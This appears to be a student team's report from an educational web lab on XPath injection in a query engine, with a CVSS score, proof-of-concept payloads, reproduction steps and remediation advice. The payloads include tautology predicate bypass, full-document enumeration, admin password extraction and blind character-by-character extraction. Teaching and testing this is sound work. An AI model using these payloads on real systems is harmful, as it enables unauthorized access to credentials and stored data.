# Vulnerability Report

 CVE-ID: EDU-WEBLAB-2026-TEAM2-015

**Title:** XPath Injection via Unsanitized User-Supplied Query Input Enabling Unauthorized Data Extraction and Access Control Bypass

**Affected Lab:** XPath Query Engine

**Component:** XPath Query Handler

**Severity:** Critical

**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

**CVSS Score:** 9.1

**Description:**
A critical XPath injection vulnerability was identified in the XPath Query Engine, where the application accepts raw, user-supplied XPath expressions and passes them directly to the query execution engine without input validation, expression sanitization, structural restriction, or parameterization of any kind. The vulnerability exists because the application treats attacker-controlled input as trusted XPath syntax, allowing an adversary to inject Boolean logic operators, wildcard axes, and recursive descent expressions that fundamentally alter the intended query behavior — bypassing access controls, enumerating the full XML document structure, and extracting data nodes that were never intended to be accessible through the query interface. By supplying tautological conditions such as `or '1'='1'` within predicate filters, an attacker can collapse all filtering logic and force the engine to return every matching node in the document regardless of intended restrictions, effectively granting unrestricted read access to the entire XML data store in a single query. Advanced injection payloads leveraging XPath axes such as `//`, `ancestor::`, `following-sibling::`, and `string()` functions enable blind extraction techniques that systematically reconstruct the complete XML document structure and its contents character by character, even in scenarios where query output is not directly reflected in the response. The combination of zero authentication requirements, no special attack conditions, and the potential for complete XML data store compromise — including credentials, access tokens, and any sensitive records stored within the XML backend — establishes this as a critical-severity vulnerability requiring immediate remediation.

**Proof of Concept:**
```xpath
(* --- PAYLOAD 1: Baseline query to confirm normal engine behavior --- *)
(* Submit the following and confirm "Alice" is returned as expected    *)

//user/name

(* Expected output: Alice *)
```
```xpath
(* --- PAYLOAD 2: Boolean tautology injection — bypass all predicates --- *)
(* Injects a tautological condition (or '1'='1') to force the engine    *)
(* to return ALL user/name nodes regardless of intended filtering        *)

//user[name='Alice' or '1'='1']/name

(* Expected output: ALL usernames in the XML document, e.g.:
   Alice
   Bob
   admin
   ...
   Confirms that predicate-based access control is completely bypassed   *)
```
```xpath
(* --- PAYLOAD 3: Full document enumeration via wildcard axis --- *)
(* Use recursive descent and wildcard to extract all nodes         *)

//*

(* Expected output: every element node in the entire XML document,
   revealing the complete data structure and all stored values      *)
```
```xpath
(* --- PAYLOAD 4: Targeted credential extraction via injected predicate --- *)
(* Enumerate admin-level records by targeting elevated role attributes     *)

//user[role='admin']/password

(* Expected output: plaintext or hashed password values for all
   users whose role attribute is set to 'admin'                            *)
```
```xpath
(* --- PAYLOAD 5: Blind XPath injection — character-by-character extraction --- *)
(* Use substring() and string-length() to extract data without direct output  *)
(* Confirm by observing differential application behavior (true vs false)     *)

(* Test if the first character of the first password is 'a': *)
//user[substring(password,1,1)='a']

(* Test the length of the first user's password: *)
//user[string-length(password)=8]

(* Automate character enumeration to reconstruct full field values
   even when output is not directly reflected in the response              *)
```

**Steps to Reproduce:**

1. Access the XPath Query Engine interface and locate the query input field and execution control. Submit the benign baseline query `//user/name` and confirm that the engine returns the expected result (e.g., `Alice`), establishing that the application is functioning normally and that query output is reflected in the response.
2. **Test for Boolean tautology injection:** Replace the query with `//user[name='Alice' or '1'='1']/name` and submit. Observe that the engine returns all `name` nodes from the XML document rather than only the record matching `Alice`, confirming that the injected `or '1'='1'` condition successfully bypassed the predicate filter and that user input directly influences query logic.
3. **Enumerate the complete XML document structure using a wildcard axis:** Submit the payload `//*` and observe that the engine returns every element node in the document tree, revealing the full XML schema, all element names, and all stored data values — confirming unrestricted read access to the entire XML data store.
4. **Extract targeted sensitive data using an injected role predicate:** Submit the payload `//user[role='admin']/password` and observe whether the engine returns password field values for administrator-level records, confirming that XPath injection enables targeted extraction of credential data stored within the XML backend.
5. **Confirm injected axis traversal capability:** Submit `//user/parent::*/child::*` to traverse parent and sibling nodes relative to the `user` element. Observe that the engine resolves and returns data from nodes outside the originally queried context, confirming that axis-based traversal expressions are accepted without restriction.
6. **Perform blind XPath injection to confirm out-of-band extractability:** Submit `//user[substring(password,1,1)='a']` and observe whether the result set changes relative to a non-matching condition (e.g., `//user[substring(password,1,1)='z']`). A differential response — such as a different number of returned nodes or a distinct application state — confirms that blind character-by-character data extraction is feasible even without direct output reflection.
7. **Test string function abuse for data length enumeration:** Submit `//user[string-length(password)>5]` and incrementally adjust the comparison value. Observe that the engine returns differential results based on the condition, confirming that XPath string functions can be chained with Boolean conditions to enumerate field lengths and reconstruct full field values systematically.
8. **Verify that no authentication or session token is required for exploitation:** If the XPath Query Engine interface is accessible without a prior login, repeat Steps 2–4 without an authenticated session and confirm that the injection payloads succeed, establishing that the vulnerability is exploitable by a completely unauthenticated external attacker with no prerequisites.
9. **Capture a full exploitation HTTP request using Burp Suite:** Intercept the request containing an injection payload and confirm that the raw XPath expression is transmitted to the server as a plain, unencoded query parameter with no client-side pre-processing, token binding, or structural constraint that could suggest server-side protection exists independently of the observed behavior.
10. Document the complete set of data nodes returned across all successful payloads — including usernames, passwords, role assignments, and any other sensitive fields present in the XML document — confirming that the scope of exposure constitutes a total compromise of all data stored within the XML backend accessible to the query engine.

**Remediation:**

1. **Implement parameterized XPath query construction to eliminate injection by design:** Refactor all XPath query logic to use a parameterized query API or a dedicated XPath query builder that separates the query structure from user-supplied values. User input must be bound as a typed parameter — never concatenated or interpolated directly into the XPath expression string — ensuring that injected operators and axes are treated as literal string values rather than executable query syntax.
2. **Enforce strict server-side allowlist validation on all user-supplied query input:** Define an explicit set of permitted query templates, field names, and comparison values that the application requires for its intended functionality. Reject any input that does not exactly match an allowlisted pattern with an `HTTP 400 Bad Request` response before the value reaches the XPath execution engine.
3. **Restrict XPath axis and function usage to the minimum required operational subset:** Configure the query execution environment to permit only the specific axes and functions required by the application (e.g., `child::`, simple predicate equality). Disable or intercept usage of recursive descent (`//`), wildcard (`*`), `ancestor::`, `following-sibling::`, `string()`, `substring()`, `string-length()`, and all other axes and functions not required for core functionality.
4. **Validate and sanitize all user-supplied values against an XPath metacharacter blocklist as a defense-in-depth layer:** If parameterized queries cannot be implemented immediately, apply server-side escaping or rejection of all XPath metacharacters — including single quotes (`'`), double quotes (`"`), square brackets (`[`, `]`), forward slashes (`/`), asterisks (`*`), `@`, `::`, and parentheses — before incorporating any user input into a query expression.
5. **Avoid exposing raw or user-constructed XPath expressions through the application interface:** Redesign the query interface to accept only structured, application-defined inputs (e.g., field selector dropdowns, predefined query identifiers) rather than free-form XPath expressions. Translate user selections server-side into hardcoded or template-based XPath queries where user input populates only the value operand of a predefined, fixed expression structure.
6. **Apply the principle of least privilege to XML data access:** Ensure that the XPath query engine operates against a read-only view of the XML document that excludes sensitive nodes (e.g., `password`, `token`, `secret`) from the accessible document tree. Sensitive data fields should be stored outside the XML structure accessible to the query engine, or filtered from the engine's document context at instantiation time.
7. **Implement response filtering to prevent sensitive field values from being returned even if injection succeeds:** Apply an output-layer filter that inspects query results before rendering and suppresses any response nodes whose element names or content patterns match a defined list of sensitive field identifiers (e.g., `password`, `secret`, `token`, `key`). This defense-in-depth layer limits data exfiltration impact even in the event of a query construction bypass.
8. **Log all XPath query submissions and configure real-time alerting for injection indicators:** Record every query submitted to the engine, including the full expression, source IP, session identifier, and timestamp. Configure automated alerts for submissions containing XPath metacharacters, tautological conditions (`'1'='1'`), wildcard axes (`//*`), or string function calls, and treat all such events as active injection attempts requiring immediate investigation.

**Discovered By:** Team 2

**Date:** March 16 , 2026
